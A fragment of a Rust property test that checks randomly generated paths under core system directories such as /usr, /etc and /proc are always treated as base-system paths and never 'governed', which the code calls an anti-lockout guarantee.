    fn prop_base_system_paths_never_governed() {
        const BASES: &[&str] = &[
            "/usr", "/bin", "/sbin", "/lib", "/lib64", "/etc", "/boot", "/sys", "/proc", "/dev",
            "/run",
        ];
        let mut rng = Rng(0xF00D_F00D_1234_5678);
        for _ in 0..50_000 {
            let base = BASES[(rng.next() as usize) % BASES.len()];
            let suffix = rng.token(12);
            let path = if suffix.is_empty() {
                base.to_string()
            } else {
                format!("{base}/{suffix}")
            };
            assert!(is_base_system_path(&path), "{path} should be base-system");
            assert!(
                !path_is_governed(&path),
                "ANTI-LOCKOUT: base-system path {path} must never be governed"
            );
        }
    }
}
